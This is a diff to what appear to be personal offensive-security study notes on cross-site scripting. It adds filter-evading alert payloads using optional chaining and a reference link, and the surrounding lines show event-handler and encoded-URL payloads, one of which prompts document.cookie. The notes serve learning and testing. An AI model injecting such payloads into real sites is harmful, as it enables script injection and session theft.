@@ -69,6 +69,10 @@ no space⇒ `<svg/onload=alert()>`
 `"><img img src=x onerror=prompt(1);>`
 `<a onmouseover"alert(1)">test</a>`
 <svg/onload=prompt{`document.cookie`}> 
+also u can use **_the optional chaining operator_** `?.` :
+	`alert?.('Hello, World!');`
+	`const obj = { showAlert: alert }; obj.showAlert?.call(window, 'Hello, World!');`
+	`const obj = { nested: { showAlert: alert } }; obj.nested?.showAlert?.call(window, 'Hello, World!');`
 URLs: 
 ```urls
 javascript%0a:\\u0061lert(origin)
@@ -117,6 +121,7 @@ more at: file:///F:/Courses/02-cyber%20security/4-%20offensive%20security/PDFs/O
 Browsers, try to prevent reflect and stored XSS by introducing *XSS Auditors*, here's how to bypass 
 - [Browser's-XSS-Filter-Bypass-Cheat-Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 - https://blog.innerht.ml/the-misunderstood-x-xss-protection/
+- https://hahwul.com/cullinan/xss/
 
 
 
